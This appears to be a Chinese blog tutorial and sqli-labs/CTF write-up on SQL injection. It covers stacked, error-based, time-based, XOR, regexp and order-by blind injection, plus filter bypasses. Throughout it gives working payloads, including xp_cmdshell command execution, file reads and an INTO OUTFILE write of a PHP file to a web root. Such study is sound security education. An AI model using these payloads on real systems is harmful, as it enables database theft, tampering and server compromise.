+<h1 id="stacked-injection堆叠注入"><a href="#stacked-injection堆叠注入" class="headerlink" title="stacked injection堆叠注入"></a>stacked injection堆叠注入</h1><p>Stackedinjections:堆叠注入。从名词的含义就可以看到应该是一堆 sql 语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结 尾加 ; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection</p>
+<p>在 SQL 中，分号（;）是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而 union injection （联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者 unionall 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句</p>
+<p> <img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awsr0asej20ug06qn6m.jpg" alt></p>
+<h2 id="堆叠注入的局限性"><a href="#堆叠注入的局限性" class="headerlink" title="堆叠注入的局限性"></a>堆叠注入的局限性</h2><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API或者数据库引擎 不支持的限制，</p>
+<p>当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awtbp8fqj20qi03p40d.jpg" alt></p>
+<h2 id="各个数据库实例介绍"><a href="#各个数据库实例介绍" class="headerlink" title="各个数据库实例介绍"></a>各个数据库实例介绍</h2><h3 id="Mysql-数据库"><a href="#Mysql-数据库" class="headerlink" title="Mysql 数据库"></a>Mysql 数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql.exe -h127.0.0.1 -uroot -proot</span><br></pre></td></tr></table></figure>
+
+<p>（1）新建一个表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1;create table test like users;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awuwpzvej205w053n6m.jpg" alt></p>
+<p>（2）删除上面新建的 test 表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from users where id=1;drop table test;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awv0g4xij20bz09240d.jpg" alt></p>
+<p>（3）查询数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from users where id=1;select1,2,3;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awv6x8scj20bp067779.jpg" alt></p>
+<p> （4）加载文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users whereid=1;select load_file(&apos;F:\1.txt&apos;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awvfe79hj20f706dgqf.jpg" alt></p>
+<p>（5）修改数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select * from users where id=1;insert into users(id,username,password) values(&apos;100&apos;,&apos;new&apos;,&apos;new&apos;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awvqdizbj20nq0dzabp.jpg" alt></p>
+<h3 id="Sql-server-数据库"><a href="#Sql-server-数据库" class="headerlink" title="Sql server 数据库"></a>Sql server 数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(1)增加数据表 select * from test;create table sc3(ssCHAR(8));</span><br><span class="line"></span><br><span class="line">(2)删除数据表 select * from test;drop table sc3;</span><br><span class="line"></span><br><span class="line">(3)查询数据 select 1,2,3;select * from test;</span><br><span class="line"></span><br><span class="line">(4)修改数据 select * from test;update test set name=&apos;test&apos;where id=3;</span><br><span class="line"></span><br><span class="line">(5)sqlserver中最为重要的存储过程的执行 select * from test where id=1;execmaster ..xp_cmdshell &apos;ipconfig&apos;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Oracle-数据库"><a href="#Oracle-数据库" class="headerlink" title="Oracle 数据库"></a>Oracle 数据库</h3><p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awxjb8vmj20ss06dn6m.jpg" alt></p>
+<h3 id="Postgresql-数据库"><a href="#Postgresql-数据库" class="headerlink" title="Postgresql 数据库"></a>Postgresql 数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(1)新建一个表 select * from user_test;create table user_data(id DATE);</span><br><span class="line"></span><br><span class="line">(2)删除上面新建的 user_data表 select * from user_test;delete from user_data;</span><br><span class="line"></span><br><span class="line">(3)查询数据 select * from user_test;select1,2,3;</span><br><span class="line"></span><br><span class="line">(4)修改数据 select * from user_test;update user_test set name=&apos;modify&apos; where name=&apos;张三 &apos;;</span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awy8lbukj20s90c7dkz.jpg" alt></p>
+<h1 id="Less38堆叠注入-GET-POST"><a href="#Less38堆叠注入-GET-POST" class="headerlink" title="Less38堆叠注入(GET POST)"></a>Less38堆叠注入(GET POST)</h1><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>在执行 select 时的 sql 语句为：SELECT * FROM users WHERE id=&#39;$id&#39;LIMIT0,1</p>
+<p>再看数据表中的内容：可以看到 less38 已经添加</p>
+<table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=1&#39;;insert into users(id,username,password) values (&#39;38&#39;,&#39;less38&#39;,&#39;hello&#39;)--+</td>
+<td>Insert into user(id,username,password) values(<em>,</em>,*)</td>
+</tr>
+<tr>
+<td>?id=1;insert into users(id,username,password) values (&#39;38&#39;,&#39;less38&#39;,&#39;hello&#39;)--+</td>
+<td>没有单引号</td>
+</tr>
+<tr>
+<td>?id=1&#39;);insert into   users(id,username,password) values (&#39;38&#39;,&#39;less38&#39;,&#39;hello&#39;)--+</td>
+<td>有单引号和括号</td>
+</tr>
+<tr>
+<td>?id=1;insert   into users(id,username,password) values (&#39;110&#39;,&#39;less41&#39;,&#39;hello&#39;);#</td>
+<td>盲注     不回显  （第41关），注意分号和注释符号</td>
+</tr>
+</tbody></table>
+<p> <img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ax3aojmbj211b03gjxa.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ax3e3kbcj211m03jdg6.jpg" alt></p>
+<h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><p>Update 更新数据后，经过 mysql_real_escape_string()处理后的数据，存入到数据库当中后不会发生变化。在 select 调用的时候才能发挥作用。</p>
+<p>所以不用考虑在更新密码处进行注入，这关和二次注入的思路是不一样的。 本关从 login.php 源代码中分析可知：</p>
+<p>原 sql 语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>此处登录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin</span><br><span class="line">Password:c&apos;;create table less42 like users#</span><br></pre></td></tr></table></figure>
+
+<p>登录时构造的 sql 语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;admin&apos; and password=&apos;c&apos;;create table less42 like users#</span><br></pre></td></tr></table></figure>
+
+<h1 id="less43"><a href="#less43" class="headerlink" title="less43"></a>less43</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:admin</span><br><span class="line">Password:c&apos;);create table less43 like users#</span><br></pre></td></tr></table></figure>
+
+<h1 id="Less-46-order-by后的-injection"><a href="#Less-46-order-by后的-injection" class="headerlink" title="Less-46 order by后的 injection"></a>Less-46 order by后的 injection</h1><p>本关的 sql 语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM users ORDER BY $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>之前的sql语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql =SELECT * FROM users WHERE id=&apos;$id&apos;LIMIT0,1</span><br></pre></td></tr></table></figure>
+
+<p>（1）order by 后的数字可以作为一个<code>注入点</code>。也就是构造 order by 后的一个语句，让 该语句执行结果为一个数，</p>
+<p>我们尝试 <a href="http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-46/?sort=right(version(),1</a>) 没有报错，但是 right 换成 left 都一样，说明数字没有起作用，我们考虑布尔类型。此时我 们可以用报错注入和延时注入。 此处可以直接构造 ?sort= 后面的一个参数。此时，我们可以有三种形式，</p>
+<p>①直接添加注入语句，?sort=(select <strong>**</strong>)</p>
+<p>②利用一些函数。例如 rand()函数等。?sort=rand(sql 语句) Ps：此处我们可以展示一下 rand(ture)和 rand(false)的结果是不一样的。</p>
+<p>③利用 and，例如?sort=1 and (加 sql 语句)。 同时，sql 语句可以利用报错注入和延时注入的方式，语句我们可以很灵活的构造。 报错注入例子</p>
+<table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?sort=right(version(),1)</td>
+<td>SELECT   * FROM users ORDER BY right(version(),1)</td>
+</tr>
+<tr>
+<td>?sort=rand(ture)</td>
+<td>这里我的显示报错</td>
+</tr>
+<tr>
+<td>rand(false)</td>
+<td>正常显示</td>
+</tr>
+<tr>
+<td>?sort=(select   count(<em>) from information_schema.columns group by concat(0x3a,0x3a,(select   user()),0x3a,0x3a,floor(rand()</em>2)))</td>
+<td>报错注入例子</td>
+</tr>
+<tr>
+<td>?sort=rand(ascii(left(database(),1))=115)</td>
+<td>rand注入   116或者其他数字会显示不变</td>
+</tr>
+<tr>
+<td>?sort=(SELECT   IF(SUBSTRING(current,1,1)=CHAR(115), BENCHMARK(50000000,md5(&#39;1&#39;)),null)   FROM (select database() as current) as tb1)</td>
+<td>延时注入</td>
+</tr>
+<tr>
+<td>?id=1&#39; UNION   SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(&#39;MSG&#39;,&#39;by 5 seconds&#39;)),null)),2,3 FROM (select database() as current)</td>
+<td>BENCHMARK注入</td>
+</tr>
+<tr>
+<td>?sort=1   and If(ascii(substr(database(),1,1))=115,0,sleep(5))</td>
+<td>延时注入</td>
+</tr>
+<tr>
+<td>?sort=1  procedure   analyse(extractvalue(rand(),concat(0x3a,version())),1)</td>
+<td>procedure   analyse 参数后注入</td>
+</tr>
+<tr>
+<td>?sort=1   into outfile &quot;f:\2.txt&quot;</td>
+<td>将查询结果导入到文件当中</td>
+</tr>
+<tr>
+<td>?sort=1&#39; into outfile &quot;E:\Website\phpStudy\PHPTutorial\WWW\1.php&quot; lines terminated by   0x3c3f70687020706870696e666f28293b3f3e2020 --+    要求两个\</td>
+<td>写文件</td>
+</tr>
+</tbody></table>
+<h1 id="Less-50-order-by-stackedinjection"><a href="#Less-50-order-by-stackedinjection" class="headerlink" title="Less-50 order by stackedinjection"></a>Less-50 order by stackedinjection</h1><p>执行 sql 语句我们这里使用的是 <code>mysqli_multi_query()</code>函数，而之前我们使用的是 <code>mysqli_query()</code>，区别在于 mysqli_multi_query()可以执行多个 sql 语句，而 mysqli_query()只能执行 一个 sql 语句，那么我们此处就可以执行多个 sql 语句进行注入，也就是我们之前提到的 statcked injection。</p>
+<table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?sort=1&#39;;create   table less51 like users;--+</td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="Less54-challenges"><a href="#Less54-challenges" class="headerlink" title="Less54 challenges"></a>Less54 challenges</h1><p>获取数据库中的表</p>
+<p><a href="http://127.0.0.1/Range/sqli-labs-master/Less-54/index.php?id=-1&#39;union" target="_blank" rel="noopener">http://127.0.0.1/Range/sqli-labs-master/Less-54/index.php?id=-1&#39;union</a> select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39; --+`</p>
+<p>获取数据库中的列</p>
+<p><a href="http://127.0.0.1/Range/sqli-labs-master/Less-54/index.php?id=-1&#39;union" target="_blank" rel="noopener">http://127.0.0.1/Range/sqli-labs-master/Less-54/index.php?id=-1&#39;union</a> select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;r72tr45smo&#39; --+</p>
+<p>获取数据库列的数据</p>
+<p><a href="http://127.0.0.1/Range/sqli-labs-master/Less-54/index.php?id=-1&#39;union" target="_blank" rel="noopener">http://127.0.0.1/Range/sqli-labs-master/Less-54/index.php?id=-1&#39;union</a> select 1,2,group_concat(secret_FKE1) from challenges.r72tr45smo --+</p>
+<h1 id="Less58"><a href="#Less58" class="headerlink" title="Less58"></a>Less58</h1><p><a href="http://127.0.0.1/Range/sqli-labs-master/Less-58/?id=-1&#39;union" target="_blank" rel="noopener">http://127.0.0.1/Range/sqli-labs-master/Less-58/?id=-1&#39;union</a> select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),0x7e))--+</p>
+<p><a href="http://127.0.0.1/Range/sqli-labs-master/Less-58/?id=-1&#39;union" target="_blank" rel="noopener">http://127.0.0.1/Range/sqli-labs-master/Less-58/?id=-1&#39;union</a> select extractvalue(1,concat(0x7e,(select group_concat(secret_N3FR) from challenges.hnzvklti02),0x7e))--+</p>
+<p><a href="http://127.0.0.1/Range/sqli-labs-master/Less-58/?id=-1&#39;union" target="_blank" rel="noopener">http://127.0.0.1/Range/sqli-labs-master/Less-58/?id=-1&#39;union</a> select extractvalue(1,concat(0x7e,(select group_concat(secret_N3FR) from challenges.hnzvklti02),0x7e))--+</p>
+<h1 id="Less62"><a href="#Less62" class="headerlink" title="Less62"></a>Less62</h1><p><a href="http://127.0.0.1/Range/sqli-labs-master/Less-62/?id=1&#39;)and" target="_blank" rel="noopener">http://127.0.0.1/Range/sqli-labs-master/Less-62/?id=1&#39;)and</a> If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),1,1))=79,0,sleep(10))--+</p>
+<h1 id="CTF中几种通用的sql盲注手法和注入的一些tips"><a href="#CTF中几种通用的sql盲注手法和注入的一些tips" class="headerlink" title="CTF中几种通用的sql盲注手法和注入的一些tips"></a>CTF中几种通用的sql盲注手法和注入的一些tips</h1><h2 id="XOR注入"><a href="#XOR注入" class="headerlink" title="XOR注入"></a>XOR注入</h2><p>因为这种方法利用了异或符号，所以给它取名为xor注入</p>
+<p>1、基本注入payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;^(ascii(mid((password)from(i)))&gt;j)^&apos;1&apos;=&apos;1&apos;%23</span><br><span class="line">或者</span><br><span class="line">admin&apos;^(ascii(mid((password)**from**(i)**for**(1)))&gt;j)^&apos;1&apos;=&apos;1&apos;%23</span><br></pre></td></tr></table></figure>
+
+<p>我们来分析一下这个语句的格式：</p>
+<p>首先我们先根据^符号来分割开语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;</span><br><span class="line">ascii(mid((password)from(i)))&gt;j</span><br><span class="line">&apos;1&apos;=&apos;1&apos;%23</span><br></pre></td></tr></table></figure>
+
+<p>最前面和最后面的语句都固定为真（逻辑结果都为1），只有中间的语句不确定真假</p>
+<p><strong>那么整个payload的逻辑结果都由中间的语句决定</strong>，我们就可以用这个特性来判断盲注的结果了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0^1^0 --&gt; 1 语句返回为真</span><br><span class="line">0^0^0 --&gt; 0 语句返回为假</span><br></pre></td></tr></table></figure>
+
+<p>这里mid函数的使用方法：</p>
+<p>正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串</p>
+<p>MID(str,<strong>pos</strong>,len)</p>
+<p>这里的用法是，<strong>from(1)表示从第一个位置开始截取剩下的字符串，for(1)表示从改位置起一次就截取一个字符</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mid((str)from(i))</span><br><span class="line">mid((str)from(i)for(1))</span><br></pre></td></tr></table></figure>
+
+<p>看下图的查询结果应该就知道用法了：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0axxtlyudj20ls0din6m.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0axylri4hj20hr0akdkz.jpg" alt></p>
+<p>这里可能还会有疑问：为什么这里不加for可以正常运行呢？</p>
+<p>因为这里的ascii函数是默认取字符串中<code>第一个字符的ascii码</code>做为输出</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0axzzo6o1j20ff0ad779.jpg" alt></p>
+<p>2、使用场景</p>
+<p>过滤了关键字：and、or</p>
+<p>过滤了逗号，</p>
+<p>过滤了空格</p>
+<p>如果这里过滤了=号的话，还可以用&gt;或者&lt;代替(大小的比较)</p>
+<p>payload：<code>admin&#39;^(ascii(mid((password)from(i)))&gt;j)^(&#39;2&#39;&gt;&#39;1&#39;)%23</code></p>
+<p><strong>如果这里过滤了%号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了 &#39;1&#39;=&#39;1</strong></p>
+<h2 id="regexp注入"><a href="#regexp注入" class="headerlink" title="regexp注入"></a>regexp注入</h2><p>1、基本注入payload</p>
+<p>select (select语句) regexp &#39;正则&#39;</p>
+<p>下面举一个例子来说明一下用法：</p>
+<p>首先正常的查询语句是这样：</p>
+<p><code>select user_pass from users where user_id = 1</code></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay2nl6mzj20ho0a7n6m.jpg" alt></p>
+<p>接着进行正则注入，若匹配则返回1，不匹配返回0</p>
+<p><code>select (select user_pass from users where user_id = 1) regexp &#39;^a&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay3uhbfzj20kd0agdkz.jpg" alt></p>
+<p>这里的^表示pattern的开头</p>
+<p>接着一步步判断</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay4giujgj20kv0b9779.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay4q14gcj20ma0aggqf.jpg" alt></p>
+<p>或者regexp这个关键字还可以代替where条件里的=号</p>
+<p><code>select from users where user_pass regexp &#39;^a9&#39;</code></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay6au6auj20mn0boabp.jpg" alt></p>
+<p>2、使用场景</p>
+<p>过滤了=、in、like</p>
+<p>这里的<code>^</code>如果也被过滤了的话，可以使用$来从后往前进行匹配</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay7lbcg5j20m40awjra.jpg" alt></p>
+<p>详细的正则注入教程可以看这里：</p>
+<p><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
+<h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><p>1、基本注入payload</p>
+<p><code>select * from users where user_id = &#39;1&#39; union select 1,2,&#39;a&#39;,4,5,6,7 order by 3</code></p>
+<p>首先先看看order by的使用方法：</p>
+<p>order by &#39;number&#39; (asc/desc)</p>
+<p>即对某一列进行排序，<strong>默认是升序排列</strong>，即后面默认跟上asc，那么上面一句就相当于</p>
+<p><strong>select</strong> * <strong>from users order by</strong> 3 <strong>asc</strong></p>
+<p>我们在注入时经常会使用order by来判断数据库的列数，那我们这里使用他配合union select来进行注入</p>
+<p>2、原理分析</p>
+<p>首先正常的注入是蓝色那部分的字符串，这里我们的目的是要注出test用户的user_pass值</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayc3zzx7j20mn0czn6m.jpg" alt></p>
+<p><strong>接着我们在语句后面加上order by 3，即对第三列进行升序排列(按照ascii码表)</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayd11rf3j20mg0cfdkz.jpg" alt></p>
+<p>这里的user_pass列中的3是我们union select里面的第三列，这里就把&#39;3&#39;替换为&#39;a&#39;</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayd96325j20mp0as779.jpg" alt></p>
+<p>这里可能看不出什么变化，那么把他改成&#39;b&#39;看看</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0aydphjwej20mi0atgqf.jpg" alt></p>
+<p>看到用户test跑到第一行来了，所以这里经常用来判断有返回差异的注入，且返回只有一列的输出，根据差异来判断我们盲注的值是否正确</p>
+<p>当然这里也可以使用<code>order by desc</code>降序排列来注入，所以这里要根据使用场景来进行选择</p>
+<p>3、使用场景</p>
+<p>过滤了列名</p>
+<p>过滤了括号</p>
+<p>适用于已知该表的列名以及列名位置的注入</p>
+<h2 id="实例讲解"><a href="#实例讲解" class="headerlink" title="实例讲解"></a>实例讲解</h2><p>1、ascii盲注来自skctf login3的一道题，bugku上也有：</p>
+<p>题目链接：<a href="http://123.206.31.85:49167/" target="_blank" rel="noopener">http://123.206.31.85:49167/</a></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayf7cat1j20xm0j8abp.jpg" alt></p>
+<p>是标准的登陆框，因为存在注入，先fuzz一下过滤了什么字符。使用bp的intruder模块载入字典进行fuzz(字典在后面会分享给大家)。</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayfp6qipj213h0guq4d.jpg" alt></p>
+<p>可以看到这里的=，空格、and、or都被过滤了，但是&gt;、&lt;、^没有被过滤，所以这里使用ascii盲注</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayfycybjj20qq0o2jxa.jpg" alt></p>
+<p>这里最后是要注入出admin的password，过程就不详细讲解了，直接给出payload：</p>
+<p><code>username = admin&#39;^(ascii(mid((password)from(1)))&gt;1)^(&#39;2&#39;&gt;&#39;1&#39;)%23</code></p>
+<p><strong>网鼎杯第二场的一道注入题sqlweb的其中一种解法也是用到这种ascii盲注</strong></p>
+<p>这个payload和我们上面说的是一样的，所以这个就靠你们自己慢慢消化了。</p>
+<p>2、regexp盲注是来自实验吧一道注入题</p>
+<p>题目链接：<a href="http://ctf5.shiyanbar.com/web/earnest/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/earnest/index.php</a></p>
+<p>writeup链接：<a href="http://www.shiyanbar.com/ctf/writeup/4828" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/writeup/4828</a></p>
+<p>当初也是看着p牛的wp做的，发现这道虽然难了点，但是里面的sql的知识点考的倒是不错，是练习过waf的一道好题目。</p>
+<p>这道题只有一个id作为输入点，id存在注入点，但是过滤了很多东西，前面的步骤就不详细说了，去看p牛的详细解答</p>
+<p>看到这里，过滤了^，但是没过滤$，所以xor注入就无效了，这边选择regexp注入使用$符号从后往前注入</p>
+<p>0&#39; or (<strong>select</strong> (<strong>select</strong> fl$4g <strong>from</strong> fiag <strong>limit</strong> 1) regexp &#39;%s$&#39;) <strong>or</strong> &#39;pcat&#39;=&#39;</p>
+<p>这里是用python写的脚本，一个一个的对字符串的正则匹配得到最后flag</p>
+<p>3、union盲注利用起来比较简单，就是利用上面说的那些条件进行注入，例子是来自蓝鲸ctf的一道ctf题目：</p>
+<p>题目链接：<a href="http://ctf.whaledu.com:10012/52gw5g4hvs59/" target="_blank" rel="noopener">http://ctf.whaledu.com:10012/52gw5g4hvs59/</a></p>
+<p>题目好像进不去了，但是可以看<a href="http://note.youdao.com/noteshare?id=94ae1c287b7d49a55a7590f1b826df17&sub=4621B6951500439F8D75AF9E8A77A0E2" target="_blank" rel="noopener">writeup</a></p>
+<p>首先题目存在sql注入还有一个上传点，可以通过注入拿到<strong>所有源码</strong></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayio3zqsj20nq0b50tr.jpg" alt></p>
+<p>拿到之后进行审计，发现上传时文件以随机字符串上传到了/Up10aD/文件夹下，我们的目的就是要通过注入拿到上传后的文件，在原来的注入点使用order by盲注将文件名得到:</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayk3u4qyj20wh06rn6m.jpg" alt></p>
+<p>重点就在order by盲注这，<strong>注入点在id这里</strong>：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayksx06sj20uw03pdkz.jpg" alt></p>
+<p>那么写出order by盲注的脚本如下图：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayl2d362j20x40gw779.jpg" alt></p>
+<p>这里存在过滤，绕过的方法是双写绕过，所以payload看起来不是很清楚，正常的应该是这样的：</p>
+<p>image = 79 union distinct <strong>select</strong> 0x{filename} <strong>order by</strong> 1 <strong>desc</strong></p>
+<p><strong>注意前面的image=79是存在的图片的id，这样order by才可以进行对比实现</strong></p>
+<p>这个注入形式也是和我们上面讲解一样，所以大家可以自己找题目来练习。</p>
+<h2 id="其他的一些小tips"><a href="#其他的一些小tips" class="headerlink" title="其他的一些小tips"></a>其他的一些小tips</h2><p>1、一些等效替代的函数(特殊符号)</p>
+<p>字符：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">空格 &lt;--&gt; %20、%0a、%0b、/**/、 @tmp:=test</span><br><span class="line">and &lt;--&gt; or</span><br><span class="line">&apos;=&apos; &lt;--&gt; &apos;like&apos; &lt;--&gt; &apos;in&apos; --&gt; &apos;regexp&apos; &lt;--&gt; &apos;rlike&apos; --&gt; &apos;&gt;&apos; &lt;--&gt; &apos;&lt;&apos;</span><br><span class="line"></span><br><span class="line">@tmp:=test只能用在select关键字之后，等号后面的字符串随意</span><br></pre></td></tr></table></figure>
+
+<p>函数：</p>
+<p>字符串截断函数：left()、mid()、<strong>substr</strong>()、substring()<br>取ascii码函数：<strong>ord</strong>()、ascii()</p>
+<p>2、 一次性报所有表明和字段名</p>
+<p>(<strong>SELECT* (@) **FROM</strong> (<strong>SELECT</strong>(@:=0x00),(<strong>SELECT</strong> (@) <strong>FROM</strong> (information_schema.columns) <strong>WHERE</strong> (table_schema&gt;=@) <strong>AND</strong> (@)<strong>IN</strong> (@:=<strong>CONCAT</strong>(@,0x0a,&#39; [ &#39;,table_schema,&#39; ] &gt;&#39;,table_name,&#39; &gt; &#39;,column_name))))x)</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayo757taj20ty0dfgqf.jpg" alt></p>
+<p>3、Subquery returns more than 1 row的解决方法</p>
+<p>产生这个问题的原因是子查询多于一列，也就是显示为只有一列的情况下，没有使用limit语句限制，就会产生这个问题，即limt 0,1</p>
+<p>如果我们这里的逗号被过滤了咋办？那就使用offset关键字：</p>
+<p>limit 1 offset 1</p>
